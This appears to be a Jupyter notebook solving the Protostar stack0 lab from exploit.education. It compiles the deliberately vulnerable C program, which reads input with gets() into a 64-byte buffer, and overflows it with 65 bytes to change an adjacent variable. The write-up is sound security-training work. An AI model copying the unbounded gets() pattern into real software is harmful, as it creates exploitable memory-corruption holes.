{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "13c10c12",
   "metadata": {},
   "source": [
    "# protostar/stack0 solution\n",
    "\n",
    "https://exploit.education/protostar/stack-zero/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e19c27a8",
   "metadata": {},
   "source": [
    "## compile source code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "3dc86244",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/bin/ld: /tmp/cc0vs7Xo.o: in function `main':\n",
      "src.c:(.text+0x2c): warning: the `gets' function is dangerous and should not be used.\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "src = r\"\"\"\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  volatile int modified;\n",
    "  char buffer[64];\n",
    "\n",
    "  modified = 0;\n",
    "  gets(buffer);\n",
    "\n",
    "  if(modified != 0) {\n",
    "      printf(\"you have changed the 'modified' variable\\n\");\n",
    "  } else {\n",
    "      printf(\"Try again?\\n\");\n",
    "  }\n",
    "}\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "with open(\"src.c\", \"w\") as f:\n",
    "    f.write(src)\n",
    "\n",
    "_ = os.system('gcc src.c -m32 -w -o prog')  # 32bit. disable warnings."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f905ff2",
   "metadata": {},
   "source": [
    "## solution\n",
    "\n",
    "Typing a string with length > 64 will cause a buffer overflow, hence making `modified` variable hold a non-zero value which causes the desired output."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "ec0e683a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "you have changed the 'modified' variable\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "import subprocess\n",
    "from subprocess import PIPE\n",
    "\n",
    "p = subprocess.Popen(['./prog'],stdin=PIPE,stdout=PIPE)\n",
    "res, err = p.communicate(b'A'*65)\n",
    "print(res.decode(\"utf-8\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "6391f1c9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Python version\n",
      "3.9.10 (main, Jan 16 2022, 17:12:18) \n",
      "[GCC 11.2.0]\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "print(\"Python version\")\n",
    "print (sys.version)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
